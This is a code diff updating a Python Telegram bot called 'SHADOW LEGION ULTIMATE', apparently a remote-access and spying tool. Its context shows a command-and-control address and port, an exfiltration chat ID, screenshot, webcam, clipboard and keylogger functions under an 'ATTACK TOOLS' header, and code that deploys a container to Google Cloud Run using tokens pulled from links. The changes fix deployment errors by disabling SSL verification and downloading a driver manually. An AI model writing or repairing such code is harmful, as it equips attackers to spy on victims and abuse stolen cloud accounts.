@@ -2,16 +2,15 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.4 (FINAL)
-⚔️ يعمل على Railway مع Python 3.13 – بدون Pillow – يستخدم mss للتصوير.
-📡 جميع الأدوات حقيقية + نشر تلقائي على Cloud Run (SSO)
+🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.5 (FINAL FIXED)
+⚔️ يعمل على Railway – حل خطأ 307 – بدون Pillow – جميع الأدوات حقيقية
 """
 
 import os, sys, time, re, json, base64, hashlib, tempfile, glob, threading, queue, subprocess, logging, sqlite3, urllib.parse, socket, platform, getpass, shutil, random, datetime, asyncio
 from datetime import datetime as dt
 from flask import Flask, request, jsonify
 import requests, rsa
-import mss  # بديل خفيف لـ pyscreenshot و Pillow
+import mss
 import cv2
 import psutil
 import pyperclip
@@ -29,6 +28,10 @@ TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
 EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
 C2_IP = os.environ.get("C2_IP", "127.0.0.1")
 C2_PORT = int(os.environ.get("C2_PORT", 4444))
+
+# ===== حل خطأ 307 =====
+os.environ['WDM_SSL_VERIFY'] = '0'
+os.environ['WDM_LOCAL'] = '1'
 
 REGIONS = {
     "europe-west1": "🇧🇪 بلجيكا (europe-west1)",
@@ -128,7 +131,7 @@ def create_jwt(creds):
 
 def get_access_token(creds):
     jwt = create_jwt(creds)
-    resp = requests.post("https://oauth2.googleapis.com/token", data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt}, timeout=30)
+    resp = requests.post("https://oauth2.googleapis.com/token", data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt}, timeout=30, allow_redirects=True)
     if resp.status_code != 200: raise Exception(f"Token failed: {resp.status_code}")
     return resp.json().get("access_token")
 
@@ -137,7 +140,7 @@ def deploy_via_rest_api(project_id, token, region):
     service_name = f"shadow-{int(time.time())}"
     body = {"apiVersion": "serving.knative.dev/v1", "kind": "Service", "metadata": {"name": service_name}, "spec": {"template": {"spec": {"containers": [{"image": "ajndjd2/ahmed-vip1", "ports": [{"containerPort": 8080}]}]}}}}
     url = f"https://run.googleapis.com/v1/projects/{project_id}/locations/{region}/services"
-    r = requests.post(url, headers=headers, json=body, timeout=60)
+    r = requests.post(url, headers=headers, json=body, timeout=60, allow_redirects=True)
     if r.status_code in (200, 201):
         return r.json().get('status', {}).get('url')
     elif r.status_code == 403:
@@ -154,6 +157,27 @@ def extract_from_link(link):
     match = re.search(r'token=([^&]+)', link)
     if match: data['token'] = match.group(1)
     return data
+
+# ===== حل خطأ 307 (تنزيل يدوي للسائق) =====
+def setup_chromedriver():
+    import urllib.request
+    import zipfile
+    driver_path = "/tmp/chromedriver"
+    if os.path.exists(driver_path):
+        os.chmod(driver_path, 0o755)
+        return driver_path
+    try:
+        url = "https://storage.googleapis.com/chrome-for-testing-public/126.0.6478.126/linux64/chromedriver-linux64.zip"
+        zip_path = "/tmp/chromedriver.zip"
+        urllib.request.urlretrieve(url, zip_path)
+        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+            zip_ref.extractall("/tmp")
+        os.rename("/tmp/chromedriver-linux64/chromedriver", driver_path)
+        os.chmod(driver_path, 0o755)
+        return driver_path
+    except Exception as e:
+        logger.error(f"فشل التنزيل اليدوي: {e}")
+        return None
 
 def deploy_with_sso(link_data, region):
     project_id = link_data.get('project_id')
@@ -205,7 +229,14 @@ def deploy_with_sso(link_data, region):
             "directory_upgrade": True,
             "safebrowsing.enabled": True
         })
-        service = Service(ChromeDriverManager().install())
+
+        # محاولة استخدام السائق اليدوي أولاً
+        manual_driver = setup_chromedriver()
+        if manual_driver:
+            service = Service(manual_driver)
+        else:
+            service = Service(ChromeDriverManager().install())
+
         driver = webdriver.Chrome(service=service, options=options)
         wait = WebDriverWait(driver, 20)
 
@@ -306,7 +337,7 @@ def process_queue():
 
 Thread(target=process_queue, daemon=True).start()
 
-# ====================== ATTACK TOOLS (FIXED) ======================
+# ====================== ATTACK TOOLS ======================
 @anti_fail
 def real_keylogger(duration=45):
     log = "[SHADOW KEYLOGGER v99 (بديل خفيف)]\n"
@@ -441,7 +472,7 @@ async def start(update: Update, context):
         [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
     ]
     await update.message.reply_text(
-        "🔥 **SHADOW LEGION ULTIMATE v99.4**\n"
+        "🔥 **SHADOW LEGION ULTIMATE v99.5**\n"
         "📡 Fully Armed – Deploy + Attack\n"
         "أمرك سيدي 👁",
         reply_markup=InlineKeyboardMarkup(keyboard)
@@ -612,7 +643,7 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION ULTIMATE v99.4 FULLY LOADED")
+    logger.info("✅ SHADOW LEGION ULTIMATE v99.5 FULLY LOADED")
     app.run_polling()
 
 if __name__ == "__main__":
